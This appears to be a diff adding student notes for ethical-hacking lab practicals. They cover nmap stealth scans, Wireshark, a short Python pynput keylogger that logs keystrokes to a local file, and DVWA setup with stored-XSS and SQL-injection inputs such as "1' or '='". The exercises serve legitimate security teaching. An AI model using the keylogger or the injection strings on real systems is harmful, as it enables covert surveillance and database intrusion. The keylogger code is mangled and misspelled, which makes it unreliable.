@@ -1,0 +1,84 @@
+EHp2 :- cryptool
+● Open CrypTool and Type Text
+● Select Symmetric modern then RC4
+● Change the bits to 32(binary)
+P3 :- cmd
+● Open Cmd and tracert www.google.com
+● Ping ip address
+● Ipconfig
+● Netstat
+● arp -a
+P4 :- nmap
+● Ipconfig
+● nmap 192.168.29.213
+● nmap -sA -T4 scanme.nmap.org
+● nmap -p22,113,139 scanme.nmap.org
+● nmap -sF -T4 para
+● nmap -sF -T4 192.168.29.213
+● nmap -sN -p22 scanme.nmap.org
+● nmap -sX -T4 scanme.nmap.org
+P5 :-
+wireshark
+● Install and open WireShark.
+● Click on capture and in input select Wifi and start.
+● Open Yahoo Website in new Window and Register if required
+● Open WireShark again and write ‘HTTP’ and proceed
+P6
+Code :- python
+from pynput.keyboard import Key,Listener import
+logging
+log_dir = r&quot;C:\users\ADMIN\Desktop&quot; filename =
+log_dir + r&quot;\key-log.txt&quot;
+logging.basicConfig(filename=filename,level=logging.DEBUG,format=&#39;%(asctime)s:%(m esssages)s:&#39;)
+def on_press(key): logging.info(str(key))
+with Listener(on_press=on_press) as listener:
+listener.join()
+● Save the file on the following path
+● cmd&gt;pip install pynput
+P7 :- xampp
+● Open XAMPP ,start Apache and MySQL
+● Start the “Apache” - it won’t start
+● Click on config &gt; open Apache(httpd-ssl.conf)
+● Press Ctrl+H and replace 443 to 444 and save the file.
+● Start Apache , it will start now.
+● To start MySQL &gt; Go to config &gt; mu.ini
+● Change the port number to 3307 and save the file.
+● Go to services of your computer &gt; Select MySQL &gt; Start
+● Apache and MySQL have now started.
+● Go to Localhost:/ 8080/setup.php and login using username:admin , password :
+● password.
+● Download DVWA
+● Go to DVWA download &gt; Github &gt; Code &gt; Download ZIP
+● Extract the file then Copy the extracted file
+● Paste to : C&gt;xampp&gt;htdocs&gt;DVWA (rename as DVWA from DVWA-master)
+● Go to admin panel of Apache
+● Change path to: localhost/dvwa/
+● It will show error message , complete the following steps to to solve the error
+● Rename file as config.inc
+● Now the site will open
+● Write the name as the same as the config.inc - file in Renamed DVWA file
+● Click on new to create a database
+● Now, click on the created database ‘dvwa’.
+● Click on privileges
+● Click on “add user account.”
+● Write the same user as it is given in the config file : User field and password.
+● Now, scroll down and click on “Go” , now check on “Grant” and click Go.
+● Updated successfully.
+● localhost:8080
+● localhost:8080/dashboard/ → localhost:8080/dvwa/
+● Open a home page.
+● Once logged in we want to navigate to DVWA security tab , select “low” in the
+● drop down box and hit submit.
+● . Stored Cross Side Scripting
+● Click “XSS(Stored)”
+● Type the following in respective field and click on “Sign Guestbook”
+P8:- xampp
+● .Open XAMPP and start apache and mysql and Go to web browser and enter
+● http://localhost/phpmyadmin/
+● Create a database with name dvwa
+● Open a home page
+● Go to site localhost: 8080/setup.php after login and click on setup/reset database. Connect with database
+● Click on SQL injection option in left.Write “1’ or ‘=’” on textbox and click submit.
+● Write “1” in the textbox and click on submit button.
+● Write “1=1” in textbox and click on the submit button.
+● Write “1*” in the textbox and click on submit button.
